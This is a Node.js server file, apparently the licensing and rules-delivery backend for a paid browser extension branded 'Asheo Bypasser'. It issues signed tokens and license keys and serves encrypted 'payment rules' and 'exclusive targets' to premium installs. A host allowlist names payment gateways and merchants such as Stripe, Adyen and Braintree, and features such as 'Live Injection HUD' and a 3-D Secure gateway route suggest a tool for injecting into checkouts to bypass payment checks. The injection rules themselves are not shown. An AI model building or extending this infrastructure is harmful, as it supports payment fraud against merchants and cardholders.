function normalizeKey(k){ if(!k||typeof k!=='string')return ''; return k.trim().toUpperCase().replace(/\s+/g,'').replace(/[^A-Z0-9\-]/g,''); }
async function redisCmd(args) {
  if (!UPSTASH_URL || !UPSTASH_TOKEN) throw new Error('redis_not_configured');
  const r = await fetch(UPSTASH_URL, { method:'POST', headers:{ Authorization:`Bearer ${UPSTASH_TOKEN}`, 'Content-Type':'application/json' }, body: JSON.stringify(args) });
  if (!r.ok) throw new Error('redis_http_'+r.status);
  const d = await r.json();
  if (d.error) throw new Error(d.error);
  return d.result;
}
async function redisSet(key, value) { return redisCmd(['SET', normalizeKey(key), typeof value === 'string' ? value : JSON.stringify(value)]); }
async function redisGetRaw(key) { const v = await redisCmd(['GET', normalizeKey(key)]); if (v == null) return null; try { return JSON.parse(v); } catch { return v; } }
async function redisGet(key) { const v = await redisGetRaw(key); return v ? migrarLicenca(v) : null; }
async function redisDel(key) { return redisCmd(['DEL', normalizeKey(key)]); }
async function redisScan(pattern='ASHEO-*') {
  const out = []; let cursor = '0';
  do {
    const res = await redisCmd(['SCAN', cursor, 'MATCH', pattern, 'COUNT', 200]);
    cursor = String(res[0]);
    if (Array.isArray(res[1])) out.push(...res[1]);
  } while (cursor !== '0');
  return out.filter(k => typeof k === 'string');
}
async function redisIndexInstall(installId, licenseKey) { return redisCmd(['SET', normalizeKey('ASHEO-INSTALL-' + installId), normalizeKey(licenseKey)]); }
async function redisLookupInstall(installId) { return redisCmd(['GET', normalizeKey('ASHEO-INSTALL-' + installId)]); }
async function redisDelIndexInstall(installId) { return redisCmd(['DEL', normalizeKey('ASHEO-INSTALL-' + installId)]); }

/* ═══ HELPERS ═══ */
function migrarLicenca(lic) {
  if (!lic || typeof lic !== 'object') return lic;
  const n = { ...lic };
  if (!n.plano && n.plan) n.plano = n.plan === 'premium' ? 'life' : n.plan;
  if (!n.plano) n.plano = '30d';
  const pk = PACOTES[n.plano];
  if (!n.planoNome) n.planoNome = pk ? pk.nome : 'Premium';
  if (typeof n.dias !== 'number') n.dias = pk ? pk.dias : 30;
  n.lifetime = n.plano === 'life';
  n.ilimitada = n.lifetime;
  if (!n.criadaEm && n.createdAt) n.criadaEm = n.createdAt;
  if (!n.criadaEm) n.criadaEm = Date.now();
  if (!n.expiraEm || (typeof n.expiraEm !== 'number')) { n.expiraEm = n.lifetime ? n.criadaEm + (100*365*24*60*60*1000) : n.criadaEm + (n.dias*24*60*60*1000); }
  if (typeof n.ativa !== 'boolean') n.ativa = typeof n.active === 'boolean' ? n.active : true;
  if (typeof n.preco === 'string') n.preco = parseFloat(n.preco.replace(/[^\d.,]/g,'').replace(',','.')) || 0;
  if (!n.preco) n.preco = pk ? pk.preco : 0;
  n.preco_usd = n.preco; n.preco_fmt = precoFmt(n.preco);
  return n;
}
function signToken(claims, kid){ if(!PRIVATE_KEY) throw new Error('Chave privada nao inicializada'); const opts = { algorithm:'ES256' }; if (kid) opts.keyid = kid; return jwt.sign(claims, PRIVATE_KEY, opts); }
function formatDate(ts){ if(!ts || ts <= 0) return 'Nunca'; return new Date(ts).toLocaleString('pt-BR',{timeZone:'America/Sao_Paulo',day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit'}); }
function humanTime(ms){ if(ms<=0) return '✕ expirada'; const s=Math.floor(ms/1000), d=Math.floor(s/86400), h=Math.floor((s%86400)/3600), m=Math.floor((s%3600)/60); if(d>0) return `${d}d ${h}h ${m}m`; if(h>0) return `${h}h ${m}m`; return `${m}m`; }
function progressBar(pct, size=10){ pct = Math.max(0, Math.min(100, pct)); const cheio = Math.round(pct*size/100); return '▰'.repeat(cheio) + '▱'.repeat(size-cheio); }
function generateLicenseKey(){ const chars='ABCDEFGHJKLMNPQRSTUVWXYZ23456789'; const b=()=>{let s='';for(let i=0;i<4;i++)s+=chars[crypto.randomInt(0,chars.length)];return s;}; return `ASHEO-${b()}-${b()}-${b()}-${b()}`; }
function validateBearer(req){ const auth=req.headers['authorization']||''; if(!auth.startsWith('Bearer '))return {ok:false,error:'missing_bearer'}; try{ const d=jwt.verify(auth.substring(7),PUBLIC_KEY||PRIVATE_KEY,{algorithms:['ES256'],clockTolerance:30}); return {ok:true,decoded:d}; } catch(e){ return {ok:false,error:e.message}; } }
function validateAsheoPass(req){ const auth=req.headers['authorization']||''; if(!auth.startsWith('Asheo-Pass '))return {ok:false,error:'missing_asheo_pass'}; try{ const d=jwt.verify(auth.substring(11).trim(),PUBLIC_KEY||PRIVATE_KEY,{algorithms:['ES256'],clockTolerance:30}); return {ok:true,decoded:d,mode:'asheo-pass'}; } catch(e){ return {ok:false,error:'asheo_pass_invalid:'+e.message}; } }
function validateAnyAuth(req) {
  const auth = req.headers['authorization'] || '';
  if (auth.startsWith('Bearer ')) return validateBearer(req);
  if (auth.startsWith('Asheo-Pass ')) return validateAsheoPass(req);
  return { ok:false, error:'missing_auth' };
}
function buildSecret(installId, licenseKey) { return crypto.createHash('sha256').update(String(installId||'') + ':' + String(licenseKey||'') + ':asheo-secret-v1').digest('hex'); }
function buildKid(licenseKey) {
  if (!licenseKey) return null;
  const norm = normalizeKey(licenseKey);
  const parts = norm.split('-');
  if (parts.length >= 2 && parts[0] === 'ASHEO') return `${parts[0]}-${parts[1]}`;
  return norm.substring(0, 14);
}
function buildEntitlement(lic, installId, seatsUsed = 1) {
  const isPremium = lic && lic.ativa && (lic.lifetime || lic.expiraEm > Date.now());
  const plano = lic ? lic.plano : 'free';
  const isTrial = plano === '3d' || (lic && lic.trial);
  const features = {}; FEATURE_KEYS.forEach(k => { features[k] = !!isPremium; });
  const capabilities = {}; CAPABILITY_KEYS.forEach(k => { capabilities[k] = !!isPremium; });
  const limits = isPremium ? { ...PREMIUM_LIMITS } : { ...FREE_LIMITS };
  return {
    tier: isPremium ? 'premium' : 'free',
    plan: isPremium ? (isTrial ? 'trial' : 'premium') : 'free',
    planDisplayName: isPremium ? (isTrial ? 'Premium Trial' : 'Premium') : 'Free',
    licenseType: isPremium ? (isTrial ? 'trial' : 'premium') : 'free',
    status: isPremium ? 'active' : 'inactive',
    source: lic ? 'license' : 'free',
    isFounder: false,
    activatedAt: lic ? (lic.ativadaEm || lic.criadaEm) : null,
    expiresAt: lic ? lic.expiraEm : null,
    nextBillingDate: lic ? lic.expiraEm : null,
    seatsAllowed: isPremium ? 999999 : 1,
    seatsUsed: isPremium ? Math.max(1, seatsUsed) : 0,
    activationCount: isPremium ? Math.max(1, seatsUsed) : 0,
    maxActivations: null,
    currentDeviceId: installId,
    deviceLocked: !!(lic && lic.installId),
    canTransfer: false,
    features, featureKeys: FEATURE_KEYS,
    customFeatures: {},
    capabilities, capabilityKeys: CAPABILITY_KEYS,
    limits, limitKeys: LIMIT_KEYS,
    metadata: lic ? { trial: isTrial, trialHours: isTrial ? 36 : null } : {}
  };
}
function deriveAesKey(installId, licenseKey) { return Buffer.from(buildSecret(installId, licenseKey || 'guest'), 'hex'); }
function encryptPack(data, installId, licenseKey) {
  const key = deriveAesKey(installId, licenseKey);
  const nonce = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, nonce);
  const encrypted = Buffer.concat([cipher.update(JSON.stringify(data), 'utf8'), cipher.final()]);
  const tag = cipher.getAuthTag();
  return { ct: Buffer.concat([encrypted, tag]).toString('base64'), nonce: nonce.toString('base64'), v: RULES_VERSION };
}

const provCache = new Map();
function generateProv(installId, kid) {
  if (!PRIVATE_KEY) return null;
  const key = installId || 'default';
  const cached = provCache.get(key);
  if (cached && (Date.now() - cached.ts) < 55 * 60 * 1000) return cached.prov;
  try {
    const opts = { algorithm:'ES256', expiresIn:'1h' };
    if (kid) opts.keyid = kid;
    const prov = jwt.sign({ sub: key, jti: crypto.randomUUID(), iat: Math.floor(Date.now()/1000) }, PRIVATE_KEY, opts);
    provCache.set(key, { prov, ts: Date.now() });
    // cap de tamanho (BUG #20 do report)
    if (provCache.size > 5000) { const first = provCache.keys().next().value; provCache.delete(first); }
    return prov;
  } catch (e) { log('ERRO','generateProv: '+e.message); return null; }
}
function buildGwPass(installId, expSec, kid) {
  if (!PRIVATE_KEY) return null;
  const now = Math.floor(Date.now()/1000);
  const exp = expSec || (now + 600);
  const opts = { algorithm:'ES256' };
  if (kid) opts.keyid = kid;
  return jwt.sign({ sub: installId, purpose:'gw-pass', iat: now, exp, jti: crypto.randomUUID() }, PRIVATE_KEY, opts);
}

const rlMap = new Map();
function rateLimit(key, max = 20, windowMs = 60000) {
  const now = Date.now();
  const rec = rlMap.get(key) || { count: 0, ts: now };
  if (now - rec.ts > windowMs) { rec.count = 0; rec.ts = now; }
  rec.count++;
  rlMap.set(key, rec);
  return rec.count <= max;
}
const rlInterval = setInterval(() => { const now = Date.now(); for (const [k,v] of rlMap.entries()) if (now - v.ts > 5*60*1000) rlMap.delete(k); }, 60000);
if (rlInterval.unref) rlInterval.unref();

async function validateHmac(req, rawBody) {
  const installId = req.headers['x-asheo-install'];
  const ts = req.headers['x-asheo-ts'];
  const sig = req.headers['x-asheo-sig'];
  const build = req.headers['x-asheo-build'] || '';
  if (!installId || !ts || !sig) return { ok: false, error: 'missing_hmac_headers' };
  const nowSec = Math.floor(Date.now() / 1000);
  if (Math.abs(nowSec - Number(ts)) > 300) return { ok: false, error: 'hmac_expired' };
  let licenseKey = null;
  try { licenseKey = await redisLookupInstall(installId); } catch (e) { return { ok: false, error: 'hmac_lookup_failed' }; }
  if (!licenseKey) return { ok: false, error: 'hmac_unknown_install' };
  const secret = buildSecret(installId, licenseKey);
  const method = (req.headers['x-asheo-method'] || req.method).toUpperCase();
  // BUG #29 do report: extensão assina com path + query, server usava só req.path
  const urlParts = (req.originalUrl || req.url || '').split('?');
  const path = req.path || urlParts[0];
  const query = urlParts[1] ? '?' + urlParts[1] : '';
  const bodyStr = rawBody ? rawBody.toString('utf8') : '';
  const bodyHash = crypto.createHash('sha256').update(bodyStr).digest('hex');
  // Payload alinhado com inject.js (method \n path \n query \n ts \n bodyHash \n build)
  const payload = `${method}\n${path}\n${query}\n${ts}\n${bodyHash}\n${build}`;
  const expected = crypto.createHmac('sha256', secret).update(payload).digest('hex');
  try {
    const a = Buffer.from(sig, 'hex');
    const b = Buffer.from(expected, 'hex');
    if (a.length !== b.length) return { ok: false, error: 'hmac_length_mismatch' };
    return crypto.timingSafeEqual(a, b) ? { ok: true, licenseKey } : { ok: false, error: 'hmac_invalid' };
  } catch (e) { return { ok: false, error: 'hmac_compare_failed' }; }
}

function sendMaybeGzip(req, res, payload) {
  const body = typeof payload === 'string' ? payload : JSON.stringify(payload);
  if (req.method === 'HEAD') {
    res.setHeader('Content-Type', 'application/json; charset=utf-8');
    res.setHeader('Content-Length', Buffer.byteLength(body, 'utf8'));
    return res.end();
  }
  const acceptEnc = String(req.headers['accept-encoding'] || '').toLowerCase();
  if (acceptEnc.includes('gzip') && body.length > 512) {
    try {
      const gz = zlib.gzipSync(Buffer.from(body, 'utf8'));
      res.setHeader('Content-Encoding', 'gzip');
      res.setHeader('Content-Type', 'application/json; charset=utf-8');
      res.setHeader('X-Compressed', 'gzip');
      return res.send(gz);
    } catch (e) { log('WARN', 'gzip falhou: ' + e.message); }
  }
  res.setHeader('Content-Type', 'application/json; charset=utf-8');
  return res.send(body);
}

// BUG #4 do report: isAllowedTarget mais estrito (sem SSRF via sufixo largo)
// Verifica: protocolo https, hostname não é IP literal, e hostname casa com allowlist exata/sufixo.
const ALLOWED_HOST_SUFFIXES = [
  'stripe.com','worldpay.com','endurance.com','safecharge.com','paddle.com','adyen.com',
  'boosteroid.com','chess.com','gog.com','lootbar.com','xsolla.com','recurly.com',
  'tebex.io','nordpayments.com','grammarly.com','gr4vy.app','rizzup.net','fortis.tech',
  'basistheory.com','braintree-api.com','braintreegateway.com','mercadopago.com','xendit.co','razorpay.com',
  'paystack.co','paystack.com','payu.in','epicgames.com','apps.net.pk','primer.io',
  'bluesnap.com','bridgerpay.com','spreedly.com','openpay.mx','openpay.co','openpay.pe',
  'nmi.com','transactiongateway.com','sagepay.com','vivapayments.com','codapayments.com',
  'checkout.com','airwallex.com','tokenex.com','cashfree.com','zuora.com','verygoodproxy.com',
  'patreon.com','authorize.net'
];
function isAllowedTarget(targetUrl) {
  if (!targetUrl || typeof targetUrl !== 'string') return false;
  let u;
  try { u = new URL(targetUrl); } catch { return false; }
  if (u.protocol !== 'https:') return false;
  const host = u.hostname.toLowerCase();
  if (!host) return false;
  // Bloqueia IP literal (SSRF para metadata cloud / localhost)
  if (/^\d{1,3}(\.\d{1,3}){3}$/.test(host)) return false;
  if (host === 'localhost' || host === '0.0.0.0') return false;
  return ALLOWED_HOST_SUFFIXES.some(s => host === s || host.endsWith('.' + s));
}

module.exports = { app, log, redisCmd, redisSet, redisGet, redisGetRaw, redisDel, redisScan,
  redisIndexInstall, redisLookupInstall, redisDelIndexInstall, migrarLicenca, signToken,
  formatDate, humanTime, progressBar, generateLicenseKey, validateBearer, validateAsheoPass,
  validateAnyAuth, buildSecret, buildKid, buildEntitlement, deriveAesKey, encryptPack,
  generateProv, buildGwPass, rateLimit, validateHmac, sendMaybeGzip, isAllowedTarget,
  PRIVATE_KEY, PUBLIC_KEY, PAYMENT_RULES, EXCLUSIVE_TARGETS, GATEWAYS_META, PACOTES,
  precoFmt, FEATURE_KEYS, CAPABILITY_KEYS, LIMIT_KEYS, PREMIUM_SCOPE, PREMIUM_LIMITS,
  FREE_LIMITS, RULES_VERSION, UPSTASH_URL, UPSTASH_TOKEN, TELEGRAM_TOKEN, OWNER_ID,
  TELEGRAM_WEBHOOK_SECRET, SERVER_URL, ALLOWED_HOST_SUFFIXES, redactCard, banner };
/* ═══════════════════════════════════════════════
   ◈ HEALTH · VERSION · STATUS
   ═══════════════════════════════════════════════ */
const healthHandler = (req,res) => res.json({ok:true,status:'healthy',uptime:Math.floor(process.uptime()),version:'8.5.1',codename:'Quantum+',timestamp:new Date().toISOString()});
app.get('/',(req,res)=>res.json({ok:true,service:'mozlince-nebula',version:'8.5.1',codename:'Quantum+',status:'live',serverUrl:SERVER_URL}));
app.get('/v1/health',healthHandler); app.get('/api/v1/health',healthHandler); app.get('/health',healthHandler);

function versionHandler(req,res){
  res.json({
    ok:true, version:'8.5.1', versionName:'Quantum+', codename:'Quantum+', api:'v1',
    minClientVersion:'1.0.0',
    downloadUrl:'https://download.asheobypasser.net/get',
    notes:'API sincronizada com a extensão v1.6.2 · swap-only estável · rotas Express 4 corrigidas · headers upstream repassados',
    mandatory:false, channel:'stable',
    timestamp:new Date().toISOString()
  });
}
app.get('/v1/version',versionHandler); app.get('/api/v1/version',versionHandler);

const statusHandler = (req,res)=>res.json({ok:true,service:'mozlince-nebula',version:'8.5.1',codename:'Quantum+',hora:new Date().toISOString()});
app.get('/v1/status',statusHandler); app.get('/api/v1/status',statusHandler);

/* ═══ MAP FUNCTIONS ═══ */
function mapFeatures(on) { const o={}; FEATURE_KEYS.forEach(k=>o[k]=!!on); return o; }
function mapCapabilities(on) { const o={}; CAPABILITY_KEYS.forEach(k=>o[k]=!!on); return o; }

/* ═══ BOOTSTRAP ═══ */
function bootstrapHandler(req,res){
  const auth = validateAnyAuth(req);
  const isPremium = auth.ok && auth.decoded.tier === 'premium' && !!(auth.decoded.licenseKey || auth.decoded.plano);
  const installId = req.headers['x-asheo-install'] || req.headers['x-install-id'] || (auth.ok ? auth.decoded.sub : 'default');
  const licenseKey = auth.ok ? (auth.decoded.licenseKey || '') : '';
  const kid = licenseKey ? buildKid(licenseKey) : 'ASHEO-FREEREF';
  const prov = generateProv(installId, kid);
  const secretHex = buildSecret(installId, licenseKey || 'guest');
  const packKey = Buffer.from(secretHex, 'hex').toString('base64');
  const encPack = encryptPack({ rules: PAYMENT_RULES, version: RULES_VERSION }, installId, licenseKey);
  const packFmt = (req.headers['x-asheo-pack-fmt'] || '').toLowerCase();

  res.setHeader('x-asheo-pack-fmt', 'enc');
  log('BOOT', `Bootstrap auth=${auth.ok} tier=${isPremium?'premium':'free'} installId=${String(installId).substring(0,12)}…`);

  if (packFmt === 'enc') {
    return sendMaybeGzip(req, res, {
      ok:true, version:'8.5.1', codename:'Quantum+', apiVersion:'v1',
      issuedAt:new Date().toISOString(), serverTime:Date.now(),
      source:isPremium?'premium':'free', sourceType:'server', isFounder:false, tier:isPremium?'premium':'free', kind:isPremium?'premium':'free',
      rulesVersion: RULES_VERSION, v: RULES_VERSION,
      pack: isPremium ? { encPack: encPack, k: packKey } : null, encPack: isPremium ? encPack : null, k: isPremium ? packKey : null, _prov: prov,
      exclusive: isPremium ? { targets: EXCLUSIVE_TARGETS, version: '1.7.0', generatedAt: new Date().toISOString(), signature: prov } : null,
      config:{ apiBase: SERVER_URL, featuresEnabled:isPremium, premiumEnabled:isPremium, syncEnabled:true, gatewayMode:'default', telemetryEnabled:false, retryAfterMs:5000, heartbeatMs:60000 },
      flags:{ bootstrapReady:true, exclusiveEnabled:isPremium, rulesEnabled:isPremium, premium:isPremium },
      endpoints:{ activate:'/v1/activate',featureActivate:'/v1/feature/activate',deactivate:'/v1/deactivate',verify:'/v1/verify',bootstrap:'/v1/bootstrap',rules:'/v1/rules',gateways:'/v1/gateways',campaign:'/v1/campaign',dashboard:'/v1/dashboard',health:'/v1/health',version:'/v1/version',support:'/v1/support',paymentRules:'/v1/bootstrap',timehw:'/v1/timehw',update:'/v1/update/check',process:'/v1/process',gw3ds2:'/v1/gw/*' },
      features:mapFeatures(isPremium), capabilities:mapCapabilities(isPremium),
      limits: isPremium ? { ...PREMIUM_LIMITS } : { ...FREE_LIMITS }, scope: isPremium ? PREMIUM_SCOPE : ['free']
    });
  }

  res.json({
    ok:true, version:'8.5.1', codename:'Quantum+', apiVersion:'v1',
    issuedAt:new Date().toISOString(), serverTime:Date.now(),
    source:isPremium?'premium':'free', sourceType:'server', isFounder:false, tier:isPremium?'premium':'free', kind:isPremium?'premium':'free',
    rulesVersion: RULES_VERSION, v: RULES_VERSION,
    pack: isPremium ? { encPack: encPack, k: packKey } : null, encPack: isPremium ? encPack : null, k: isPremium ? packKey : null, _prov: prov,
    rules: isPremium ? PAYMENT_RULES : [], count: isPremium ? PAYMENT_RULES.length : 0, gateways: isPremium ? PAYMENT_RULES : [],
    exclusive: isPremium ? { targets: EXCLUSIVE_TARGETS, version: '1.7.0', generatedAt: new Date().toISOString(), signature: prov } : null,
    config:{ apiBase: SERVER_URL, featuresEnabled:isPremium, premiumEnabled:isPremium, syncEnabled:true, gatewayMode:'default', telemetryEnabled:false, retryAfterMs:5000, heartbeatMs:60000 },
    flags:{ bootstrapReady:true, exclusiveEnabled:isPremium, rulesEnabled:isPremium, premium:isPremium },
    endpoints:{ activate:'/v1/activate',featureActivate:'/v1/feature/activate',deactivate:'/v1/deactivate',verify:'/v1/verify',bootstrap:'/v1/bootstrap',rules:'/v1/rules',gateways:'/v1/gateways',campaign:'/v1/campaign',dashboard:'/v1/dashboard',health:'/v1/health',version:'/v1/version',support:'/v1/support',paymentRules:'/v1/bootstrap',timehw:'/v1/timehw',update:'/v1/update/check',process:'/v1/process',gw3ds2:'/v1/gw/*' },
    features:mapFeatures(isPremium), capabilities:mapCapabilities(isPremium),
    limits: isPremium ? { ...PREMIUM_LIMITS } : { ...FREE_LIMITS }, scope: isPremium ? PREMIUM_SCOPE : ['free']
  });
}
app.get('/v1/bootstrap',bootstrapHandler); app.get('/api/v1/bootstrap',bootstrapHandler);

/* ═══ RULES ═══ */
function rulesHandler(req,res){
  const auth = validateAnyAuth(req);
  const isPremium = auth.ok && auth.decoded.tier === 'premium' && !!(auth.decoded.licenseKey || auth.decoded.plano);
  const installId = req.headers['x-asheo-install'] || req.headers['x-install-id'] || (auth.ok ? auth.decoded.sub : 'default');
  const licenseKey = auth.ok ? (auth.decoded.licenseKey || '') : '';
  const kid = licenseKey ? buildKid(licenseKey) : 'ASHEO-FREEREF';
  const prov = generateProv(installId, kid);
  const packFmt = (req.headers['x-asheo-pack-fmt'] || '').toLowerCase();
  const secretHex = buildSecret(installId, licenseKey || 'guest');
  const packKey = Buffer.from(secretHex, 'hex').toString('base64');
  const encPack = encryptPack({ rules: PAYMENT_RULES, version: RULES_VERSION }, installId, licenseKey);
  if (packFmt === 'enc') {
    res.setHeader('x-asheo-pack-fmt', 'enc');
    log('RULES', `/v1/rules enc ${String(installId).substring(0,12)}… ${isPremium?'PREMIUM':'FREE'}`);
    return sendMaybeGzip(req, res, { ok:true, version: RULES_VERSION, v: RULES_VERSION, pack: isPremium ? { encPack: encPack, k: packKey } : null, k: isPremium ? packKey : null, _prov: prov, serverTime: Date.now() });
  }
  sendMaybeGzip(req, res, {
    ok:true, version: RULES_VERSION, v: RULES_VERSION,
    updatedAt:new Date().toISOString(), source:isPremium?'premium':'free', tier:isPremium?'premium':'free',
    scope: isPremium ? PREMIUM_SCOPE : ['free'], count: isPremium ? PAYMENT_RULES.length : 0,
    rules: isPremium ? PAYMENT_RULES : [], gateways: isPremium ? PAYMENT_RULES : [],
    pack: isPremium ? { encPack } : null, k: isPremium ? packKey : null, _prov: prov,
    serverTime: Date.now()
  });
}
app.get('/v1/rules',rulesHandler); app.get('/api/v1/rules',rulesHandler); app.get('/v1/rules/sync',rulesHandler); app.get('/api/v1/sync',rulesHandler);

function gatewaysHandler(req,res){
  const auth = validateAnyAuth(req);
  const isPremium = auth.ok && auth.decoded.tier === 'premium' && !!(auth.decoded.licenseKey || auth.decoded.plano);
  const installId = req.headers['x-asheo-install'] || req.headers['x-install-id'] || (auth.ok ? auth.decoded.sub : 'default');
  const licenseKey = auth.ok ? (auth.decoded.licenseKey || '') : '';
  const kid = licenseKey ? buildKid(licenseKey) : 'ASHEO-FREEREF';
  const prov = generateProv(installId, kid);
  sendMaybeGzip(req, res, { ok:true, source:isPremium?'premium':'free', tier:isPremium?'premium':'free', version: RULES_VERSION, count: isPremium ? PAYMENT_RULES.length : 0, gateways: isPremium ? PAYMENT_RULES : [], gatewaysMeta: GATEWAYS_META, _prov: prov, serverTime:Date.now() });
}
app.get('/v1/gateways',gatewaysHandler); app.get('/api/v1/gateways',gatewaysHandler);

async function campaignHandler(req,res){ const camp = await redisGetRaw('ASHEO-CAMPAIGN-ACTIVE').catch(()=>null); sendMaybeGzip(req, res, { ok:true, campaign: camp || null, serverTime:Date.now() }); }
app.get('/v1/campaign',campaignHandler); app.get('/api/v1/campaign',campaignHandler);

/* ═══ EXCLUSIVE MANIFEST ═══ */
function exclusiveHandler(req,res){
  const auth = validateAnyAuth(req);
  const isPremium = auth.ok && auth.decoded.tier === 'premium' && !!(auth.decoded.licenseKey || auth.decoded.plano);
  const installId = req.headers['x-asheo-install'] || (auth.ok ? auth.decoded.sub : 'default');
  const licenseKey = auth.ok ? (auth.decoded.licenseKey || '') : '';
  const kid = licenseKey ? buildKid(licenseKey) : 'ASHEO-FREEREF';
  const prov = generateProv(installId, kid);
  sendMaybeGzip(req, res, {
    ok:true, source:isPremium?'premium':'free', tier:isPremium?'premium':'free',
    manifest: isPremium ? {
      version:'1.7.0', version_name:'1.7.0', generatedAt:new Date().toISOString(), minVersion:'1.0.0',
      exclusiveFeatures: FEATURE_KEYS,
      rules: PAYMENT_RULES,
      targets: EXCLUSIVE_TARGETS,
      gateways: GATEWAYS_META,
      signature: prov
    } : null,
    _prov: prov, cachedAt:Date.now(), expiresAt:Date.now()+(23*3600*1000)
  });
}
app.get('/v1/exclusive/manifest',exclusiveHandler); app.get('/api/v1/manifest',exclusiveHandler);

function exclusiveSyncHandler(req,res){
  const auth = validateAnyAuth(req);
  const isPremium = auth.ok && auth.decoded.tier === 'premium' && !!(auth.decoded.licenseKey || auth.decoded.plano);
  const installId = req.headers['x-asheo-install'] || (auth.ok ? auth.decoded.sub : 'default');
  const licenseKey = auth.ok ? (auth.decoded.licenseKey || '') : '';
  const kid = licenseKey ? buildKid(licenseKey) : 'ASHEO-FREEREF';
  const prov = generateProv(installId, kid);
  sendMaybeGzip(req, res, {
    ok:true, source:isPremium?'premium':'free', tier:isPremium?'premium':'free',
    manifest: isPremium ? {
      version:'1.7.0', generatedAt:new Date().toISOString(),
      rules: PAYMENT_RULES, targets: EXCLUSIVE_TARGETS, gateways: GATEWAYS_META,
      signature: prov
    } : null,
    _prov: prov, cachedAt:Date.now()
  });
}
app.get('/v1/exclusive/sync',exclusiveSyncHandler); app.get('/api/v1/exclusive/sync',exclusiveSyncHandler);

/* ═══ TIME · UPDATE ═══ */
app.get('/v1/timehw', (req,res) => res.json({ ok:true, maxServer: Date.now(), at: Date.now() }));
app.get('/api/v1/timehw', (req,res) => res.json({ ok:true, maxServer: Date.now(), at: Date.now() }));
app.get('/v1/update/check', (req,res) => res.json({ ok:true, available:false, dismissedVersion:'', error:'', lastCheck:Date.now(), latest:{ downloadUrl:'https://download.asheobypasser.net/get', version:'8.5.1', mandatory:false, notes:'Você está na versão mais recente.' } }));
app.get('/api/v1/update/check', (req,res) => res.json({ ok:true, available:false, latest:{ downloadUrl:'https://download.asheobypasser.net/get', version:'8.5.1', mandatory:false, notes:'OK' } }));

/* ═══ DASHBOARD · ENTITLEMENT · PREMIUM ═══ */
function dashboardHandler(req,res){
  const auth = validateAnyAuth(req);
  const ok = auth.ok && auth.decoded.tier === 'premium' && !!(auth.decoded.licenseKey || auth.decoded.plano);
  res.json({ ok:true, source: ok?'premium':'free', sourceType:'server', isFounder:false, dashboard:{ tier: ok?'premium':'free', source: ok?'premium':'free', seat: auth.ok?1:0, seats: auth.ok?1:0, installId: auth.ok?auth.decoded.sub:null, expiresAt: auth.ok?auth.decoded.expiresAt:null, lifetime: auth.ok?auth.decoded.lifetime===true:false, features: ok?mapFeatures(true):mapFeatures(false), capabilities: ok?mapCapabilities(true):mapCapabilities(false), limits: ok?{...PREMIUM_LIMITS}:{...FREE_LIMITS}, scope: ok?PREMIUM_SCOPE:['free'] }, serverTime:Date.now() });
}
app.get('/v1/dashboard',dashboardHandler); app.get('/api/v1/dashboard',dashboardHandler);

function entitlementHandler(req,res){
  const auth = validateAnyAuth(req);
  if (!auth.ok) return res.status(401).json({ok:false,error:'missing_auth'});
  const isPremium = auth.decoded.tier === 'premium' && !!(auth.decoded.licenseKey || auth.decoded.plano);
  const ent = buildEntitlement(isPremium ? { ativa:true, plano: auth.decoded.plano || 'life', lifetime: auth.decoded.lifetime === true, expiraEm: auth.decoded.expiresAt || (Date.now()+9999999), criadaEm: auth.decoded.issuedAt || Date.now() } : null, auth.decoded.sub, isPremium ? 1 : 0);
  res.json({ ok:true, source: isPremium?'premium':'free', sourceType:'server', isFounder:false, tier:ent.tier, kind: isPremium?'premium':'free', active: isPremium, isPremium, isVerified: isPremium, installId:auth.decoded.sub, plan:ent.plan, planDisplayName:ent.planDisplayName, lifetime: auth.decoded.lifetime === true, licenseKey: auth.decoded.licenseKey || null, issuedAt: auth.decoded.issuedAt || null, expiresAt: auth.decoded.expiresAt || null, scope: isPremium?PREMIUM_SCOPE:['free'], features: mapFeatures(isPremium), capabilities: mapCapabilities(isPremium), limits: isPremium?{...PREMIUM_LIMITS}:{...FREE_LIMITS}, customFeatures: {}, exp: auth.decoded.exp*1000, serverTime:Date.now() });
}
app.get('/v1/entitlement',entitlementHandler); app.get('/api/v1/entitlement',entitlementHandler);

const PREMIUM_FEATURES_DEF = { browser_mods:{enabled:true,label:'Browser Mods'}, rule_ops_lab:{enabled:true,label:'Rule Ops Lab'}, live_injection_hud:{enabled:true,label:'Live Injection HUD'}, algo_v2:{enabled:true,label:'Algo V2'}, exclusive_rules:{enabled:true,label:'Exclusive Rules'}, advanced_automation:{enabled:true,label:'Advanced Automation'}, multi_account:{enabled:true,label:'Multi Account'}, custom_export:{enabled:true,label:'Custom Export'}, api_access:{enabled:true,label:'API Access'} };
const PREMIUM_CAPABILITIES_DEF = { priority_support:{enabled:true,label:'Priority Support'}, custom_webhooks:{enabled:true,label:'Custom Webhooks'}, cloud_sync:{enabled:true,label:'Cloud Sync'}, bulk_actions:{enabled:true,label:'Bulk Actions'}, advanced_analytics:{enabled:true,label:'Advanced Analytics'} };
function premiumDefHandler(req,res){ res.json({ ok:true, source:'premium', tier:'premium', features: PREMIUM_FEATURES_DEF, capabilities: PREMIUM_CAPABILITIES_DEF, premiumLimits: PREMIUM_LIMITS, freeLimits: FREE_LIMITS, scope: PREMIUM_SCOPE, version:'8.5.1' }); }
app.get('/v1/premium/definitions',premiumDefHandler); app.get('/api/v1/premium/definitions',premiumDefHandler);

function planosHandler(req,res){ res.json({ ok:true, currency:'USD', planos: Object.entries(PACOTES).map(([id,p])=>({ id, nome:p.nome, dias:p.dias, lifetime:p.lifetime, preco:p.preco, preco_fmt:precoFmt(p.preco), emoji:p.emoji })) }); }
app.get('/v1/planos',planosHandler); app.get('/api/v1/planos',planosHandler);

function manifestCheckHandler(req,res){ res.json({ ok:true, latest:'1.8.0', minVersion:'1.0.0', channel: req.query.channel || 'stable', serverTime:Date.now() }); }
app.get('/v1/manifest/check',manifestCheckHandler); app.get('/api/v1/manifest',manifestCheckHandler);

function packsHandler(req,res){ const id = req.params.id; res.json({ ok:true, pack:{ id, version:'1.0.0', data:null, signature: crypto.randomBytes(32).toString('hex') }, serverTime:Date.now() }); }
app.get('/v1/packs/:id',packsHandler); app.get('/api/v1/packs/:id',packsHandler);

function telemetryHandler(req,res){ res.json({ ok:true, received:true, serverTime:Date.now() }); }
app.post('/v1/telemetry',telemetryHandler); app.post('/api/v1/telemetry',telemetryHandler);

